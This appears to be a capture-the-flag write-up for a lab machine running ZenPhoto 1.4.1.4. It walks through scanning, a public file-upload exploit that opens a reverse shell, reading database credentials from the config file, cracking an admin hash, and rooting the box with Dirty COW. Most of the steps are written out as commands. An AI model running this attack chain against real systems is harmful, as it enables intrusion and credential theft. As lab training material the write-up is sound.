# ZenPhoto - Writeup

## Initial Enumeration

### Port Scanning
A comprehensive port scan revealed several open services:
```
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 83:92:ab:f2:b7:6e:27:08:7b:a9:b8:72:32:8c:cc:29 (DSA)
|_  2048 65:77:fa:50:fd:4d:9e:f1:67:e5:cc:0c:c6:96:f2:3e (RSA)
23/tcp    open  ipp           CUPS 1.4
| http-server-header: CUPS/1.4
| http-methods:
|_  Potentially risky methods: PUT
|_http-title: 403 Forbidden
80/tcp    open  http          Apache httpd 2.2.14 ((Ubuntu))
|_http-server-header: Apache/2.2.14 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
3306/tcp  open  mysql         MySQL (unauthorized)
```

From this scan, I identified that the target was running Ubuntu Linux with several services:
- OpenSSH 5.3p1
- CUPS 1.4 printing service (unusually on port 23)
- Apache 2.2.14 web server
- MySQL database server

### Web Enumeration
I began investigating the web server on port 80 with directory enumeration:
```bash
gobuster dir -u http://192.168.X.X -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

This revealed a ZenPhoto installation at the root directory. ZenPhoto is an open-source gallery CMS application. Looking at the version information in the footer, I identified it as ZenPhoto 1.4.1.4.

### Vulnerability Research
Research indicated that ZenPhoto 1.4.1.4 is vulnerable to several critical vulnerabilities:
1. Multiple PHP file upload vulnerabilities
2. Remote Code Execution via third-party library flaws
3. SQL injection vulnerabilities

The most critical vulnerability is a remote code execution in the image upload functionality (CVE-2012-5978).

## Gaining Initial Access

### Exploiting ZenPhoto
I downloaded a public exploit for ZenPhoto 1.4.1.4:
```bash
searchsploit -m php/webapps/18083.php
```

This exploit takes advantage of a file upload vulnerability in the TinyMCE editor component of ZenPhoto.

I modified the exploit to point to my target and set up a listener:
```bash
nc -lvnp 4444
```

Then executed the exploit:
```bash
php 18083.php http://192.168.X.X/
```

This uploaded a PHP web shell to the server and provided me with a reverse shell connection as the www-data user.

### Post-Exploitation Enumeration
After gaining an initial foothold, I stabilized the shell:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo; fg
```

I began enumerating the system for potential privilege escalation vectors:
```bash
find / -perm -u=s -type f 2>/dev/null
```

## Database Enumeration
I found database credentials in the ZenPhoto configuration file:
```bash
cat /var/www/zenphoto/zp-core/zp-config.php
```

This revealed the following credentials:
- **Database**: zenphoto
- **Username**: zenphoto
- **Password**: zenph0t0

I connected to the MySQL server to extract further information:
```bash
mysql -u zenphoto -p'zenph0t0' -D zenphoto
```

I extracted user credentials from the administrators table:
```sql
SELECT * FROM administrators;
```

This revealed an admin user with a hashed password, which I cracked using hashcat:
```bash
hashcat -m 300 --force hash.txt /usr/share/wordlists/rockyou.txt
```

## Privilege Escalation

### Kernel Exploitation
System enumeration revealed outdated kernel information:
```bash
uname -a
Linux ubuntu 2.6.32-21-generic #32-Ubuntu SMP i686 GNU/Linux
```

This kernel version (2.6.32) is vulnerable to multiple local privilege escalation vulnerabilities, including Dirty COW (CVE-2016-5195).

I downloaded and compiled the Dirty COW exploit:
```bash
gcc -pthread dirty.c -o dirty -lcrypt
```

Executed the exploit with a custom password:
```bash
./dirty password123
```

The exploit created a new root user in /etc/passwd with the specified password.

I switched to the newly created root user:
```bash
su firefart
```

This provided a root shell, successfully completing the challenge.

```bash
uid=0(root) gid=0(root) groups=0(root)
```

